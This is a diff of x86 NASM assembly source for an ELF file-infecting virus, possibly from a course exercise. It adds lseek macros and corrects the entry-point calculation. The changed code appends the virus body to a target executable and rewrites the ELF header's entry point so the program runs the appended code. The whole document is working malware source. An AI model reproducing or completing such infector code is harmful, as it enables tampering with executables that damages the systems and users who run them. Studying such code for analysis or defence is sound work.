@@ -46,6 +46,13 @@
     mov %1, edx
 %endmacro
 
+%macro seek_to_start 1
+    lseek %1, 0, SEEK_SET
+%endmacro
+%macro seek_to_end 1
+    lseek %1, 0, SEEK_END
+%endmacro
+
 %define STK_RES 200
 %define RDWR    2
 %define SEEK_END 2
@@ -93,10 +100,8 @@ _start:
 
     ; task 1 - NOTE: this overwrites task 0b variables
     %define %$exe_code_start_vaddr ebp-16
-    %define %$elf_header ebp-(20+ELF_HEADER_SIZE)
-    %define %$p_elf_header ebp-(24+ELF_HEADER_SIZE)
-
-    mov dword [%$exe_code_start_vaddr], 08048080h
+    %define %$elf_header ebp-(16+ELF_HEADER_SIZE)
+    %define %$p_elf_header ebp-(20+ELF_HEADER_SIZE)
 
     .print_msg:
     get_lbl_loc [%$loc], msg
@@ -137,28 +142,34 @@ _start:
     .end_check_elf_magic_number:
 
     .seek_to_end:
-    lseek [%$fd], 0, SEEK_END
+    seek_to_end [%$fd]
     mov [%$fsz], eax
 
     .append_virus_code:
     get_lbl_loc [%$loc], virus_start
     write [%$fd], [%$loc], (virus_end - virus_start)
 
-    .seek_to_start:
-    lseek [%$fd], 0, SEEK_SET
+    .seek_to_start_1:
+    seek_to_start [%$fd]
 
     .copy_elf_header:
     lea eax, [%$elf_header]
     mov dword [%$p_elf_header], eax
     read [%$fd], [%$p_elf_header], ELF_HEADER_SIZE
 
+    .seek_to_start_2:
+    seek_to_start [%$fd]
+
     .change_entry_point:
-    mov eax, dword [%$fsz]
+    mov dword [%$exe_code_start_vaddr], 008048000h
+    mov eax, 0
     add eax, dword [%$exe_code_start_vaddr]
+    add eax, dword [%$fsz]
+    add eax, dword (_start - virus_start)
     mov dword [%$elf_header+ENTRY], eax
 
     .write_ekf_header_back_to_file:
-    write [%$fd], [%$elf_header], ELF_HEADER_SIZE
+    write [%$fd], [%$p_elf_header], ELF_HEADER_SIZE
 
     .close_file:
     close [%$fd]
